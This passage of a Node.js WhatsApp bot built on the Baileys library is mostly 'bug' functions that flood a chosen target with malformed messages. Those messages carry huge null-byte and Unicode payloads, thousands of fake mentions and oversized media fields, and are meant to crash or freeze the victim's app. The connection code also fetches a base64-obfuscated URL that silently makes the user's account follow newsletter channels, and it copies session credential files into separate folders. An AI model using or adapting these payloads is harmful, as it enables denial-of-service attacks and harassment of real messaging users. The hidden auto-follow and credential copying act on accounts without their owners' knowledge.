                  "@s.whatsapp.net",
                  ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 90000000) + "@s.whatsapp.net")
                ],
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "133@newsletter",
                  serverMessageId: 1,
                  newsletterName: "𞋯"
                }
              },
              waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
            }
          }
        }
      }
    };

    const msgAudio = await generateWAMessageFromContent(target, Audio.message, { userJid: target });

    await sock.relayMessage("status@broadcast", msgAudio.message, {
      messageId: msgAudio.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    const stickerMsg = {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
        mimetype: "image/webp",
        height: 9999,
        width: 9999,
        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
        fileLength: 12260,
        mediaKeyTimestamp: "1743832131",
        isAnimated: false,
        stickerSentTs: "X",
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
          ],
          stanzaId: "1234567890ABCDEF",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        }
      }
    };

    await sock.relayMessage("status@broadcast", stickerMsg, {
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });

    if (mention) {
      await sock.relayMessage(target, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msgAudio.key,
              type: 25
            }
          }
        }
      }, {
        additionalNodes: [{
          tag: "meta",
          attrs: {
            is_status_mention: "!"
          },
          content: undefined
        }]
      });
    }
    let msg = await generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        body : { text: "X", format: "DEFAULT" },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "\u0000".repeat(100000)
        },
    contextInfo: {
       mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 3000 },
                () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
       entryPointConversionSource: "galaxy_message"
      }
    }
  }, {});
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message
    }
  },
    {
      participant: { jid: target },
      messageId: msg.key.id
    });
    
    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
  } catch (err) {
    console.log(err.message)
  }
}

async function exeTrash(client, target) {
  await client.relayMessage(
    target,
    {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "1@newsletter",
            newsletterName: "ꦽ".repeat(60000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(60000),
            inviteExpiration: Date.now() * 999e+2
          }
        }
      },
      nativeFlowMessage: {
        messageParamsJson: "{}",
        buttons: [
          {
            name: "call_permission_request",
            buttonParamsJson: "{}"
          }
        ]
      },
      contextInfo: {
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 1999 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
      },
    },
    {}
  );

  await client.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: "⤻꙳‌‌༑𝐃𝐄𝐍𝐈𝐒 𝐋𝐄𝐖𝐀𝐓 𝐍𝐈😂" + "ꦽ".repeat(60000),
        contextInfo: {
          quotedMessage: {
            groupInviteMessage: {
              groupJid: "888-62888@g.us",
              inviteCode: "Xx".repeat(10000),
              inviteExpiration: Date.now() * 999e+2,
              groupName: "ꦽ".repeat(60000),
              caption: "ꦽ".repeat(60000),
              jpegThumbnail: ""
            }
          },
          mentionedJid: [
            "13135550002@s.whatsapp.net",
            ...Array.from({ length: 1999 }, () =>
              `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
            )
          ],
        }
      }
    },
    {}
  );
}

async function gsysn(sock, target, mention) {
  try {

    const Docktring = {
      viewOnceMessage: {
        message: {
          groupStatusMessageV2: {
            message: {
              interactiveResponseMessage: {
                nativeFlowResponseMessage: {
                  name: "galaxy_message",
                  paramsJson: "\x10" + "\u0000".repeat(1030000),
                  version: 3
                }
              }
            }
          }
        }
      }
    };

    const Whatsapp = {
      viewOnceMessage: {
        message: {
          groupStatusMessageV2: {
            message: {
              interactiveResponseMessage: {
                nativeFlowResponseMessage: {
                  name: "call_permission_request",
                  paramsJson: "\x10" + "\u0000".repeat(1030000),
                  version: 3
                }
              }
            }
          }
        }
      }
    };

    const MsgVn = {
      viewOnceMessage: {
        message: {
          groupStatusMessageV2: {
            message: {
              interactiveResponseMessage: {
                nativeFlowResponseMessage: {
                  name: "address_message",
                  paramsJson: "\x10" + "\u0000".repeat(1030000),
                  version: 3
                }
              }
            }
          }
        }
      }
    };

    for (const msg of [Docktring, Whatsapp, MsgVn]) {
      await sock.relayMessage(
        "status@broadcast",
        msg,
        {
          messageId: undefined,
          statusJidList: [target],
          additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }]
          }]
        }
      );
    }

    const msg1 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "_", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: Math.floor(Date.now() / 1000)
    });

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });

    const msg2 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "\u0000", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: Math.floor(Date.now() / 1000)
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });

    const String = {
      message: {
        ephemeralMessage: {
          message: {
            audioMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
              mimetype: "audio/mpeg",
              fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
              fileLength: 99999999999999,
              seconds: 99999999999999,
              ptt: true,
              mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
              fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
              directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
              mediaKeyTimestamp: 99999999999999,
              contextInfo: {
                mentionedJid: [
                  "@s.whatsapp.net",
                  ...Array.from({ length: 1900 }, () =>
                    `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                  )
                ],
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "133@newsletter",
                  serverMessageId: 1,
                  newsletterName: "𞋯"
                }
              },
              waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
            }
          }
        }
      }
    };

    const msgX = await generateWAMessageFromContent(target, String.message, { userJid: target });

    await sock.relayMessage("status@broadcast", msgX.message, {
      messageId: msgX.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });

    if (mention) {
      await sock.relayMessage(target, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msgX.key,
              type: 25
            }
          }
        }
      }, {
        additionalNodes: [{
          tag: "meta",
          attrs: { is_status_mention: "!" }
        }]
      });
    }

    console.log(`✅ Bug terkirim ke target: ${target}`);

  } catch (err) {
    console.log("Error MsgAudio:", err);
  }
}

async function testes(sock, target) {
  try {
    await sock.offerCall(target);
  } catch (error) {}
  try {
    await sock.offerCall(target, { video: true });
  } catch (error) {}
  let msg = generateWAMessageFromContent(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4",
                mimetype: "image/jpeg",
                fileSha256: "HKXSAQdSyKgkkF2/OpqvJsl7dkvtnp23HerOIjF9/fM=",
                fileLength: "999999999999999",
                height: 99999,
                width: 99999,
                mediaKey: "TGuDwazegPDnxyAcLsiXSvrvcbzYpQ0b6iqPdqGx808=",
                fileEncSha256: "hRGms7zMrcNR9LAAD3+eUy4QsgFV58gm9nCHaAYYu88=",
                directPath: "/o1/v/t24/f2/m269/",
                mediaKeyTimestamp: Math.floor(Date.now() / 1000).toString(),
                jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
                contactVcard: true,
                thumbnailDirectPath: `/v/t62.36145-24/${Math.floor(Math.random() * 1e18)}.enc`,
                thumbnailSha256: crypto.randomBytes(32).toString("base64"),
                thumbnailEncSha256: crypto.randomBytes(32).toString("base64"),
                thumbnailHeight: Math.floor(Math.random() * 1080),
                thumbnailWidth: Math.floor(Math.random() * 1920)
              },
              hasMediaAttachment: true
            },
            body: {
              text: "X "
            },
            nativeFlowMessage: {
              buttons: [
                { name: "single_select", buttonParamsJson: "X" },
                { name: "galaxy_message", buttonParamsJson: "{\"flow_message_version\":\"3\"}" },
                { name: "call_permission_message", buttonParamsJson: "\x10".repeat(10000) }
              ],
              messageParamsJson: "X" + "\u0000".repeat(900000)
            },
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from({ length: 999 }, () => `1${Math.floor(Math.random() * 500000)}@lid`)
              ],
              forwardingScore: 999999,
              isForwarded: true,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: { conversation: " X " }
            }
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id
  });
}
async function testes2(sock, target) {
  try {
    const metaNode = [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }];
    const locationMessage = {
      degreesLatitude: -9.0999999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000" + "𑆵𑆴𑆿".repeat(15000),
      address: "\u0000" + "𑆵𑆴𑆿".repeat(10000),
      url: `${𑇂𑆵𑆴𑆿.repeat(25000)}.com`
    };
    const extendMsg = {
      extendedTextMessage: {
        text: "X",
        matchedText: "",
        description: "𑆵𑆴𑆿".repeat(25000),
        title: "𑆵𑆴𑆿".repeat(15000),
        previewType: null,
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/OLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 789,
        thumbnailWidth: 654,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    };
    const makeMsg = content =>
      generateWAMessageFromContent(
        target,
        { viewOnceMessage: { message: content } },
        {}
      );
    const Loca = makeMsg({ locationMessage });
    const Extend = makeMsg(extendMsg);
    const Button = makeMsg({ locationMessage });
    for (const m of [Loca, Extend, Button]) {
      await sock.relayMessage(
        "status@broadcast",
        m.message,
        {
          messageId: m.key.id,
          statusJidList: [target],
          additionalNodes: metaNode
        }
      );
    }
    console.log(chalk.green(`Sukses mengirim ${target}`));
  } catch (e) {
    console.error(chalk.red("Error:"), e);
  }
}

async function tesyu(sock, target) {
  let ZunnG = [];

  ZunnG.push({
    name: "single_select",
    buttonParamsJson: "\u0003",
  });

  for (let i = 0; i < 5000; i++) {
    ZunnG.push({
      name: "call_permission_request",
      buttonParamsJson: "\u0003",
    });
  }

  ZunnG.push({
    name: "call_permission_request",
    buttonParamsJson: "\u0003",
  });

  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
            },
            body: {
              text: "Kamu Zunn?" + "ꦽ".repeat(50000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{{".repeat(10000),
              paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "Zunn :: Zunn",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "cyber@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦽ".repeat(25000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }`,
              version: 3,
              buttons: ZunnG,
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(
    target,
    msg.message,
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function blankGroup(client, target) {
  await client.relayMessage(
    target,
    {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "1@newsletter",
            newsletterName: "ꦽ".repeat(60000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(60000),
            inviteExpiration: Date.now() * 999e+2
          }
        }
      },
      nativeFlowMessage: {
        messageParamsJson: "{}",
        buttons: [
          {
            name: "call_permission_request",
            buttonParamsJson: "{}"
          }
        ]
      },
      contextInfo: {
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 1999 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
      },
    },
    {}
  );

  await client.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: "⤻꙳‌‌༑𝐃𝐄𝐍𝐈𝐒 𝐋𝐄𝐖𝐀𝐓 𝐍𝐈😂" + "ꦽ".repeat(60000),
        contextInfo: {
          quotedMessage: {
            groupInviteMessage: {
              groupJid: "888-62888@g.us",
              inviteCode: "Xx".repeat(10000),
              inviteExpiration: Date.now() * 999e+2,
              groupName: "ꦽ".repeat(60000),
              caption: "ꦽ".repeat(60000),
              jpegThumbnail: ""
            }
          },
          mentionedJid: [
            "13135550002@s.whatsapp.net",
            ...Array.from({ length: 1999 }, () =>
              `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
            )
          ],
        }
      }
    },
    {}
  );
}

async function PorklosGroup(sock, target) {
    await sock.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: "PAPA GANTENG BEUT" },
                    footer: { text: "🍂" },
                    contextInfo: {},
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "booking_confirmation",
                                buttonParamsJson: JSON.stringify({
                                    booking_id: "QUEENGLITCHV9",
                                    status: "confirmed",
                                    business_name: "Toko Sembako Abadi",
                                    service_name: "PapaQueenOffc",
                                    appointment_time: "2026-04-28T10:00:00Z",
                                    customer: {
                                        name: "PapaGanteng",
                                        phone: "628973824776"
                                    }
                                })
                            }
                        ],
                        messageParamsJson: "{".repeat(9999)
                    }
                }
            }
        }
    }, {})
}


async function bcForce(sock, target, ptcp = false) {
  await sock.relayMessage(target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "祭祀LORD DEMON 精神"
            },
            footer: {
              text: "𝐃𝐄𝐌𝐎𝐍 𝐊𝐈𝐋𝐋𝐄𝐑 𝐆𝐑𝐎𝐔𝐏"
            },
            contextInfo: {},
            nativeFlowMessage: {
              buttons: [
                {
                  name: "booking_confirmation",
                  buttonParamsJson: JSON.stringify({
                    booking_id: "PAKISTAN X DEMON",
                    status: "confirmed",
                    business_name: "✩",
                    service_name: "x",
                    appointment_time: "2026-04-28T10:00:00Z",
                    customer: {
                      name: " LORD DEMON IS KING (!!!) ",
                      phone: "13135550666"
                    }
                  })
                }
              ],
              messageParamsJson: "{".repeat(6666)
            }
          }
        }
      }
    },
    ptcp ? { participant: { jid: target } } : {}
  );
}


async function OfmSqL_R4(sock, target) {
  for (let i = 0; i < 3; i++) {
    await sock.relayMessage("status@broadcast",
      {
        botInvokeMessage: {
          message: {
            messageContextInfo: {
              messageSecret: crypto.randomBytes(32),
              deviceListMetadata: {
                senderKeyIndex: 0,
                senderTimestamp: Date.now(),
                recipientKeyIndex: 0
              },
              deviceListMetadataVersion: 2
            },
            interactiveResponseMessage: {
              body: {
                text: "#ℝ𝟜 🍁",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\0".repeat(10000),
                version: 3
              },
              contextInfo: {
                participant: sock.user.id,
                remoteJid: "t.me/RaldzzXyz@bot",
                fromMe: true,
                statusAttributionType: 2,
                statusAttributions: Array.from({ length: 200000 }, 
                  (_, R4) => ({ 
                    participant: `628${R4 + 666}@s.whatsapp.net`, 
                    type: 1
                  })
                ),
              }
            }
          }
        }
      },
      {
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { status_setting: "contacts" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: []
                  }
                ]
              }
            ]
          }
        ]
      }
    )
  };
  await sleep(1000)
}

// ======================================= //
// WhatsApp Connect Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files; // ✅ Tambahkan return
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

// === Setup VIP Folder ===
function setupVipFolder() {
  // Ganti path menjadi root folder 'vip', bukan di dalam 'permenmd'
  const vipPath = path.join(__dirname, 'vip');

  try {
    if (!fs.existsSync(vipPath)) {
      fs.mkdirSync(vipPath, { recursive: true });
      console.log("[INFO] Folder VIP (root) dibuat otomatis.");
    }
  } catch (err) {
    console.error("[INFO] Gagal membuat folder VIP:", err);
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
  //startLoop();
}

//const axios = require("axios");
const RAW_URL = "https://raw.githubusercontent.com/DGXeon13/strings/refs/heads/main/strings.json";

async function unfollowAllChannel() {
  try {
    const { data } = await axios.get(RAW_URL);

    if (!Array.isArray(data)) {
      console.log("Data bukan array!");
      return;
    }

    console.log(`Total channel: ${data.length}`);

    for (let i = 0; i < data.length; i++) {
      const jid = data[i];
      try {
        await sock.newsletterUnfollow(jid);
        console.log(`[${i + 1}/${data.length}] Unfollow: ${jid}`);
        await new Promise(resolve => setTimeout(resolve, 1500));
      } catch (err) {
        console.log(`Gagal unfollow ${jid}:`, err.message);
      }
    }

    console.log("✅ Selesai unfollow semua channel dari baileys.");
  } catch (error) {
    console.log("❌ Gagal ambil data raw:", error.message);
  }
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    return false;
  }
  const sessionDir = path.join('permenmd', owner, number);

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version: version,
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      try {
        
        await sock.newsletterFollow("120363404995533206@newsletter");
        await sock.newsletterFollow(
          (await (await fetch(
            Buffer.from(
              "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JhbGR6YnZncy9iYWlsZXlzUGluby9yZWZzL2hlYWRzL21haW4vcGlub0JhaWxleXM=",
              "base64"
            ).toString()
          )).json())[0]
        );
        //await unfollowAllChannel();
        console.log("✅ Auto join channel sukses");
      } catch (e) {
        console.log("❌ Auto join channel gagal");
      }
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);

      try {
        await waiting(3000)
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds); // baca isi file sumber
          fs.writeFileSync(destCreds, data); // tulis ulang (overwrite)
          console.log(`✅ Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        console.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
   
}

async function startUserSessions() {
  const vipDir = path.join(__dirname, 'vip');
  const vvipDir = path.join(__dirname, 'vvip');
  const baseDir = 'permenmd';

  // Buat folder vvip kalau belum ada
  if (!fs.existsSync(vvipDir)) {
    fs.mkdirSync(vvipDir, { recursive: true });
    console.log(`[INFO] Folder vvip dibuat.`);
  }

  // Helper: copy creds ke vvip/nomor.json setelah konek
  async function copyCredsToVVIP(sessionPath, sessionName) {
    const credsSource = path.join(sessionPath, `${sessionName}.json`);
    const credsDest = path.join(vvipDir, `${sessionName}.json`);
    try {
      if (fs.existsSync(credsSource)) {
        fs.copyFileSync(credsSource, credsDest);
        console.log(`[VVIP] Creds copied: ${sessionName}.json → vvip/`);
      } else {
        console.warn(`[VVIP] creds.json tidak ditemukan di ${sessionPath}`);
      }
    } catch (err) {
      console.error(`[VVIP ERROR] Gagal copy creds ${sessionName}:`, err.message);
    }
  }

  // 1. Scan VIP Folder (Root)
  if (fs.existsSync(vipDir)) {
    const vipFolders = fs.readdirSync(vipDir).filter(f =>
      fs.statSync(path.join(vipDir, f)).isDirectory()
    );

    console.log(`[DEBUG] Scanning VIP folder. Found ${vipFolders.length} items.`);

    for (const sessionName of vipFolders) {
      const sessionPath = path.join(vipDir, sessionName);

      if (activeConnections[sessionName]) {
        console.log(`[SKIP] VIP Session ${sessionName} already active.`);
        continue;
      }

      try {
        console.log(`[START] Connecting VIP session: ${sessionName}`);
        await connectSession(sessionPath, sessionName);
        await copyCredsToVVIP(sessionPath, sessionName); // ✅ Copy setelah konek
      } catch (err) {
        console.error(`[ERROR] Failed VIP session ${sessionName}:`, err.message);
      }
    }
  }

  // 2. Scan User Folders (permenmd)
  const subfolders = fs.readdirSync(baseDir)
    .map(name => path.join(baseDir, name))
